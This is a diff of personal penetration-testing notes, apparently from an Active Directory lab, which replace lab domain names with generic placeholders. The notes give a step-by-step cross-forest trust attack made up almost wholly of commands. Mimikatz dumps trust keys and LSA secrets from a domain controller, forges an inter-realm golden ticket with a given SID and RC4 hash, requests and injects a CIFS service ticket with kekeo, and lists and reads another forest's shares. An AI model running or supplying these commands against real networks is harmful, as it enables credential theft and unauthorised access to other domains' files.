@@ -6,26 +6,26 @@ Not REALLY a privesc.
 
 --With DA privileges:
 
-Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName DC
 or
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName DC
 
 --then:
 
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:a7aa17f6290883ada1735f7a72aa05c9 /service:krbtgt /target:eurocorp.local /ticket:C:\Users\student71\Desktop\euro.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:subdomain.domain.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:a7aa17f6290883ada1735f7a72aa05c9 /service:krbtgt /target:bigdomain.local /ticket:C:\Users\USER\Desktop\euro.kirbi"'
 
 --then: (kekeo_old)
 
-.\asktgs C:\path\to\store.kirbi cifs/eurocorp-dc.eurocorp.local
+.\asktgs C:\path\to\store.kirbi cifs/bigdomain-dc.bigdomain.local
 
 --then: (kekeo_old)
 
-kirbirator.exe lsa .\cifs.eurocorp-dc.eurocorp.local.kirbi
+kirbirator.exe lsa .\cifs.bigdomain-dc.bigdomain.local.kirbi
 
-*In this case, we will not have access to schtasks with HOST or ls \\eurocorp-dc\c$ with CIFS, but if we access any resource which is explicitly shared
+*In this case, we will not have access to schtasks with HOST or ls \\bigdomain-dc\c$ with CIFS, but if we access any resource which is explicitly shared
 
-Invoke-ShareFinder -Domain eurocorp.local
+Invoke-ShareFinder -Domain bigdomain.local
 
-ls \\eurocorp-dc.eurocorp.local\shared
+ls \\bigdomain-dc.bigdomain.local\shared
 
 this means files are readable by other forest's DA are now readable by me too >:) WITH DA PRIVILEGES ON THE LOCAL DOMAIN!!!!!
